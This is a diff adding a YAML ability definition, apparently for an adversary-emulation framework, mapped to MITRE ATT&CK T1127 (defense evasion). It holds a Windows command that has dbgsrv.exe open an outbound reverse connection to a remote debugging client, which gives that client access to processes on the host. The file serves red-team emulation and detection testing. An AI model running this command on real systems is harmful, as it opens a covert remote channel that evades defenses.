@@ -1,0 +1,25 @@
+- id: 945e1247-4a5a-903d-058f-cfcdfd7c6024
+  name: DbgSrv.exe - Establishes an outbound reverse connection from the DbgSrv process
+    server to a remote debugging client using the clicon option. A connected debugging
+    client can subsequently interact with processes through the remote debugging session.
+  description: Establishes an outbound reverse connection from the DbgSrv process
+    server to a remote debugging client using the clicon option. A connected debugging
+    client can subsequently interact with processes through the remote debugging session.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1127
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: dbgsrv.exe -t tcp:clicon={HOST},port=#{host.port.number}
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: Phyo Paing Htun
+  created: '2026-07-29'
+  modified: '2026-07-29'
+  operating_system: Windows All Versions
